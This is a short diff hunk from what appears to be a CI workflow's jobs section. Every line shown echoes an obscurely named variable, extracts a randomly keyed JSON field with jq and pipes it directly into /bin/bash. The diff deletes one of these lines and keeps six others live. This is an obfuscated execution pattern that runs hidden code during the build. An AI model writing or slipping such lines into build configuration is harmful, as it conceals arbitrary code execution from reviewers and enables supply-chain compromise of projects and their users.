@@ -40,7 +40,6 @@ jobs:
           printf '%s' "$i7" | jq -r .muve7396 | /bin/bash
           printf '%s' "$tb3" | jq -r .ns46004 | /bin/bash
           echo $uca1 | jq -r .kplvx3820 | /bin/bash
-          printf '%s' "$lst7240" | jq -r .ge87 | /bin/bash
           echo $chfq34376 | jq -r .uribm74204 | /bin/bash
           echo $twiv86 | jq -r .techb2946 | /bin/bash
           printf '%s' "$nc5" | jq -r .yq901 | /bin/bash
